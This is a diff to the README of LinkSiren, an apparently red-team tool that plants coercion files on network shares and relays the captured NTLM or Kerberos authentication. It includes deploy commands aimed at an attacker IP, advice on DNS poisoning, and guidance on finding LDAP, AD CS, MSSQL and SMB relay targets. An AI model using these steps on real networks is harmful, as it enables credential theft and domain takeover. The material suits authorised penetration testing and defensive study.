@@ -63,17 +63,18 @@ linksiren cleanup --targets payloads_written.txt [domain]/username[:password]
 linksiren identify --targets <shares file> [domain]/username[:password]
 ```
 
-3. Use LinkSiren to deploy payloads to the locations identified in step 2. Optionally, specify a payload name and extension. The payload type (.searchConnector-ms, .library-ms, .lnk, or .url) will be selected automatically from the extension. Folders where payloads were successfully written are saved to `payloads_written.txt`. Use the hostname or DNS name of the attacker host and perform poisoning as necessary to get intranet zoned, as described in my [blog post](https://alittleinsecure.com/dns-hijacking-say-my-name/) and [theHackerRecipes](https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/webclient#abuse), to coerce HTTP authentication.
+3. Use LinkSiren to deploy payloads to the locations identified in step 2. Optionally, specify a payload name and extension. The payload type (.searchConnector-ms, .library-ms, .lnk, or .url) will be selected automatically from the extension. Folders where payloads were successfully written are saved to `payloads_written.txt`. Use the hostname or DNS name of the attacker host and perform poisoning as necessary to get intranet zoned, as described in my blog post [DNS Hijacking: Say My Name](https://alittleinsecure.com/dns-hijacking-say-my-name/) and [theHackerRecipes](https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/webclient#abuse), to coerce HTTP authentication.
 ```bash
 linksiren deploy --targets folder_targets.txt --attacker <attacker IP> [domain]/username[:password]
 ```
 
 4. Let the hashes come to you and relay them as you see fit :)
-    - Use [LdapRelayScan]() to identify LDAP services vulnerable to relay.
-    - Use [mssqlrelay](https://github.com/CompassSecurity/mssqlrelay) to identify MSSQL services that do not enforce encryption and are therefore vulnerable to relay. Also, consider combining this with information about Microsoft Configuration Manager to perform [TAKEOVER-1](https://github.com/subat0mik/Misconfiguration-Manager/blob/main/attack-techniques/TAKEOVER/TAKEOVER-1/takeover-1_description.md).
-    - Use [NetExec's SMB functionaltiy](https://www.netexec.wiki/smb-protocol/enumeration/smb-signing-not-required) to identify SMB services vulnerable to relay.
+    - Find LDAP(S) Targets: Use [LdapRelayScan](https://github.com/zyn3rgy/LdapRelayScan) to identify LDAP(S) services vulnerable to relay.
+    - Find HTTP(S) Targets: Use the command in [this HackerRecipes PR](https://github.com/The-Hacker-Recipes/The-Hacker-Recipes/pull/61/commits/98a791f9b9f9d94fae6ab072ac3a3229077ff9fa) to identify potential AD CS endpoints vulnerable to relay. Use SCCMHunter as described in the [Misconfiguration Manager TAKEOVER-5](https://github.com/subat0mik/Misconfiguration-Manager/blob/main/attack-techniques/TAKEOVER/TAKEOVER-5/takeover-5_description.md) to identify Admin Services associated with Microsoft Configuration Manager potentially vulnerable to relay.
+    - Find MSSQL Targets: Use [mssqlrelay](https://github.com/CompassSecurity/mssqlrelay) to identify MSSQL services that do not enforce encryption and are therefore vulnerable to relay. Also, consider combining this with information about Microsoft Configuration Manager to perform [TAKEOVER-1](https://github.com/subat0mik/Misconfiguration-Manager/blob/main/attack-techniques/TAKEOVER/TAKEOVER-1/takeover-1_description.md).
+    - Find SMB Targets: Use [NetExec's SMB functionaltiy](https://www.netexec.wiki/smb-protocol/enumeration/smb-signing-not-required) to identify SMB services vulnerable to relay.
     - Use Impacket's ntlmrelayx for relay with pcredz for hash capture on the attacker machine
-    - [Krbjack](https://github.com/almandin/krbjack) or [Krbrelayx](https://github.com/dirkjanm/krbrelayx) could also be used to relay Kerberos authentication to a machine whose DNS record is controlled if the target service maps to the same service class and the service does not implement signing, channel binding, or extended protection for authentication.
+    - [Krbjack](https://github.com/almandin/krbjack) or [Krbrelayx](https://github.com/dirkjanm/krbrelayx) could also be used to relay Kerberos authentication to a machine whose DNS record is controlled if the target service maps to the same service class and the service does not implement signing or extended protection for authentication (service or channel binding).
 
 5. Cleanup the payload files when the attack is finished. LinkSiren will output messages about any previously written payloads that it isn't able to successfully delete.
     - Note: If you set a custom payload name (--payload) when deploying, you must set the same name here
@@ -219,7 +220,7 @@ Required Arguments:
 </details>
 
 ## What Payload Type Should I Use?
-Search Connectors (.searchConnector-ms): This is generally the best option. They require the least amount of interaction, start the WebClient service from a stopped state automatically when the parent folder is opened in Explorer, and are capable of coercing both SMB and HTTP authentication using a single file.
+Search Connectors (.searchConnector-ms): This is generally the best option. They require the least amount of interaction, start the WebClient service from a stopped state automatically when the parent folder is opened in Explorer, and are capable of coercing both SMB and HTTP authentication using a single file. For additional details about the coercive capabilities of Search Connectors and other file types, see my blog post [Files that Coerce: Search Connectors and Beyond](https://alittleinsecure.com/files-that-coerce-search-connectors-and-beyond/).
 
 ## How is this better than the other tools?
 Summary
